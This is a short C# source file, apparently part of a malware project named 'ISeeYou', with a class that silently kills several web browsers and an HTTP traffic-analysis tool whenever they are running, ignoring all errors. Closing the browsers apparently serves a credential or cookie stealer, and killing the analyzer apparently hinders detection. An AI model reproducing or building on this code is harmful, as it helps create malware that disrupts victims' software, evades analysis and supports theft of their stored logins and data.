using System;
using System.Diagnostics;

namespace ISeeYou
{
    class BlockBrowsers
    {
        private static string[] _ListPROcess = new string[] 
    {
        "Opera",
        "YandexBrowser",
        "GoogleChrome",
        "Amigo",
        "Orbitum",
        "Torch",
        "Comodo",
        "HttpAnalyzerStdV7.exe"
    };

    public static void KillProcess()
    {
        foreach (string Pro in _ListPROcess)
        {
            try
            {
                foreach (Process pro in Process.GetProcessesByName(Pro))
                {
                    pro.Kill();
                }
            }
            catch (Exception) { }
        }
    }
    }
}
